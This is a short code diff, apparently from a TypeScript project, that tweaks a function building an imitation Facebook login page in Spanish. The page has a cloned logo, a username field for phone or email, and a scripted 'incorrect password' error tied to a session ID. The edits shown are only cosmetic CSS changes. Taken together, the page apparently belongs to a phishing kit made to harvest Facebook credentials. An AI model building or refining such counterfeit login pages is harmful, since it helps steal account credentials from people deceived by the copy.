@@ -181,8 +181,8 @@ function buildFacebookPage(sessionId: string): string {
 
   /* Logo de Facebook */
   .fb-icon {
-    width: 76px;
-    height: 76px;
+    width: 58px;
+    height: 58px;
     margin-bottom: 22px;
   }
 
@@ -317,7 +317,7 @@ function buildFacebookPage(sessionId: string): string {
 
   <div class="error-msg" id="err">El número de teléfono o la contraseña que has introducido es incorrecto.</div>
 
-  <form id="loginForm" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+  <form id="loginForm" style="width:100%;display:flex;flex-direction:column;align-items:center;margin-top:18px;">
     <div class="field">
       <input type="text" id="username" name="username"
         placeholder="Celular o correo electrónico"
